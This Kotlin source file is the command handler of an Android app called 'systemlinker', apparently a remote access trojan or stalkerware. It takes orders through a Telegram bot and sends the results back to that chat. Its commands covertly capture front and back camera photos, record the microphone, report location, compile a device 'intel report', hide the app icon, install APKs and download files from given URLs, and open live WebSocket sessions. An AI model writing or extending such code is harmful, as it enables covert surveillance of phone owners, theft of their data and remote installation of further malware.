package com.systemlinker.features

import android.content.Context
import com.systemlinker.base.ErrorLogger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

class CommandProcessor(
    private val context: Context,
    private val telegramBotToken: String,
    private val adminChatId: Long
) {
    private val uploader = TelegramUploader(context, telegramBotToken, adminChatId)
    private val liveSessionManager = LiveSessionManager(context)
    private val mediaHandler = MediaHandler(context)
    private val systemHandler = SystemHandler(context)
    private val processorScope = CoroutineScope(Dispatchers.IO)

    fun execute(payload: JSONObject) {
        val cmd = payload.optString("cmd", "")
        val arg = payload.optString("arg", "")

        processorScope.launch {
            try {
                when (cmd) {
                    "ping" -> {
                        val bat = systemHandler.getBasicBatteryStatus()
                        uploader.sendText("🟢 Device Online\n$bat")
                    }
                    "cam_front" -> {
                        uploader.sendText("Capturing front camera...")
                        val file = mediaHandler.takePicture(isFront = true)
                        if (file != null) uploader.sendFile(file, "photo", "Front Camera")
                        else uploader.sendText("Camera capture failed.")
                    }
                    "cam_back" -> {
                        uploader.sendText("Capturing back camera...")
                        val file = mediaHandler.takePicture(isFront = false)
                        if (file != null) uploader.sendFile(file, "photo", "Back Camera")
                        else uploader.sendText("Camera capture failed.")
                    }
                    "mic" -> {
                        val duration = arg.toIntOrNull() ?: 15
                        uploader.sendText("Recording mic for ${duration}s...")
                        val file = mediaHandler.recordAudio(duration)
                        if (file != null) uploader.sendFile(file, "audio", "Mic Record (${duration}s)")
                        else uploader.sendText("Mic recording failed.")
                    }
                    "loc" -> {
                        uploader.sendText("Fetching location...")
                        uploader.sendText(systemHandler.getLocation())
                    }
                    "flash" -> {
                        val enable = arg == "on"
                        uploader.sendText(systemHandler.setFlashlight(enable))
                    }
                    "vol" -> {
                        val level = arg.toIntOrNull() ?: return@launch
                        systemHandler.setVolume(level)
                        uploader.sendText("Volume set to $level%")
                    }
                    "info" -> {
                        uploader.sendText("Generating massive intelligence report. Please wait...")
                        val reportFile = systemHandler.generateFullSystemReport()
                        uploader.sendDocument(reportFile, "Full Device Intel Report")
                    }
                    "get_log" -> {
                        uploader.sendText("Uploading error logs...")
                        val logFile = ErrorLogger.getLogFile(context)
                        uploader.sendDocument(logFile, "SystemLinker Error Logs")
                    }
                    "clear_log" -> {
                        ErrorLogger.clearLogs(context)
                        uploader.sendText("Error logs cleared.")
                    }
                    "live_start" -> {
                        if (arg.startsWith("ws")) {
                            uploader.sendText("Initiating Live WebSocket Connection...")
                            liveSessionManager.connect(arg.trim())
                        } else {
                            uploader.sendText("Error: Invalid WebSocket URL provided.")
                        }
                    }
                    "live_stop" -> {
                        liveSessionManager.disconnect()
                        uploader.sendText("Live Session Terminated.")
                    }
                    
                    // ==========================================
                    // NEW COMMANDS ADDED BELOW (Keeping old intact)
                    // ==========================================

                    "install_app" -> {
                        uploader.sendText("Attempting to install APK from: $arg")
                        systemHandler.installApp(arg)
                    }
                    "uninstall_app" -> {
                        uploader.sendText("Attempting to uninstall package: $arg")
                        systemHandler.uninstallApp(arg)
                    }
                    "icon_hide" -> {
                        uploader.sendText(systemHandler.setAppIconVisibility(false))
                    }
                    "icon_show" -> {
                        uploader.sendText(systemHandler.setAppIconVisibility(true))
                    }
                    "toggle_wifi" -> {
                        val enable = arg == "on"
                        uploader.sendText(systemHandler.setWifiState(enable))
                    }
                    "toggle_bt" -> {
                        val enable = arg == "on"
                        uploader.sendText(systemHandler.setBluetoothState(enable))
                    }
                    "toggle_hotspot" -> {
                        val enable = arg == "on"
                        uploader.sendText(systemHandler.setHotspotState(enable))
                    }
                    "scan_wifi" -> {
                        uploader.sendText("Scanning Wi-Fi networks...\n" + systemHandler.getWifiScanResults())
                    }
                    "scan_bt" -> {
                        uploader.sendText("Scanning Bluetooth devices...\n" + systemHandler.getBluetoothScanResults())
                    }
                    "download_url" -> {
                        try {
                            val json = JSONObject(arg)
                            val url = json.optString("url")
                            val dest = json.optString("path", "")
                            uploader.sendText("Starting download from URL...")
                            uploader.sendText(systemHandler.downloadFileFromUrl(url, dest))
                        } catch (e: Exception) {
                            uploader.sendText("Invalid JSON for download_url. Expected {\"url\":\"...\", \"path\":\"...\"}")
                        }
                    }
                }
            } catch (e: Exception) {
                ErrorLogger.logError(context, "CommandExecute_${cmd}", e)
                uploader.sendText("Execution failed for command: $cmd")
            }
        }
    }
}